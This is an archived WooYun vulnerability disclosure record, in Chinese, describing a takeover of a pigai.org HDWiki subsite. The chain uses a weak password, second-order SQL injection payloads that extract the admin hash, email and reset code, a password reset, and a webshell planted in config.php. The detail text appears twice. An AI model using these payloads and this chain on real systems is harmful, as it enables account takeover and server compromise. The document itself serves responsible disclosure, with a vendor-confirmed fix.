{"id": 47332, "wybug_id": "wooyun-2014-087125", "wybug_title": "批改网某业务getshell", "wybug_corp": "pigai.org", "wybug_author": "Th1nk", "wybug_date": "2014-12-14 16:55", "wybug_open_date": "2015-01-28 16:56", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["渗透测试思路"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-28：\t细节向公众公开  简要描述： 批改网某分站getshell 详细说明：  http://wiki.pigai.org/某账户存在弱口令pigai pigai123成功登陆。\n\n该分站采用的是hdwiki的cms，该cms存在漏洞。1.注入漏洞相关请看乌云 WooYun: hdwiki二次注入 直接提交评论\n',1236789,1), ('admin','1','0','2','admin','xxx',(select concat(username,0x20,password) from wiki_user where uid=1),236789,1)#\n//注意换行符 会被转义 所以提交之前看清楚点举报--确定--然后返回短信息\n\n结果发现该md5无法解开，看来管理员安全意识挺强，密码复杂。继续。漏洞2 WooYun: Hdwiki 设计缺陷 知邮箱可改密码（包括管理员） 该漏洞引发我的思考，其实我们根本不用去爆破auth。结合这个sql注入，就可以直接拿到存在表中的code。找回密码的code存在表wiki_activation中，先通过注入得到管理员的邮箱。\n',1236789,1), ('admin','1','0','2','admin','xxx',(select email from wiki_user where uid=1),236789,1)#\n邮箱为admin@admin.com\n\n然后注入出wiki_activation表中的code。\n',1236789,1), ('admin','1','0','2','admin','xxx',(select code from wiki_activation where uid=1 order by time desc limit 1),236789,1)#\n\n\n访问链接：http://wiki.pigai.org/index.php?user-getpass-1-f728f481f5d0a21d0604fa544d421858重设管理员密码（此处重设为test1test2）成功登陆\n\n接下来可以getshell后台--模块--文件管理貌似只有config.php有权限，添加一个一句话木马。\n\n成功拿到shell。\n\n   漏洞证明：  http://wiki.pigai.org/某账户存在弱口令pigai pigai123成功登陆。\n\n该分站采用的是hdwiki的cms，该cms存在漏洞。1.注入漏洞相关请看乌云 WooYun: hdwiki二次注入 直接提交评论\n',1236789,1), ('admin','1','0','2','admin','xxx',(select concat(username,0x20,password) from wiki_user where uid=1),236789,1)#\n//注意换行符 会被转义 所以提交之前看清楚点举报--确定--然后返回短信息\n\n结果发现该md5无法解开，看来管理员安全意识挺强，密码复杂。继续。漏洞2 WooYun: Hdwiki 设计缺陷 知邮箱可改密码（包括管理员） 该漏洞引发我的思考，其实我们根本不用去爆破auth。结合这个sql注入，就可以直接拿到存在表中的code。找回密码的code存在表wiki_activation中，先通过注入得到管理员的邮箱。\n',1236789,1), ('admin','1','0','2','admin','xxx',(select email from wiki_user where uid=1),236789,1)#\n邮箱为admin@admin.com\n\n然后注入出wiki_activation表中的code。\n',1236789,1), ('admin','1','0','2','admin','xxx',(select code from wiki_activation where uid=1 order by time desc limit 1),236789,1)#\n\n\n访问链接：http://wiki.pigai.org/index.php?user-getpass-1-f728f481f5d0a21d0604fa544d421858重设管理员密码（此处重设为test1test2）成功登陆\n\n接下来可以getshell后台--模块--文件管理貌似只有config.php有权限，添加一个一句话木马。\n\n成功拿到shell。\n\n   修复方案：  更新或者替换HDWIKI   版权声明：转载请注明来源 Th1nk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-12-14 21:06 厂商回复： 马上更换 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-04 09:32 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  干得漂亮，组合攻击    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}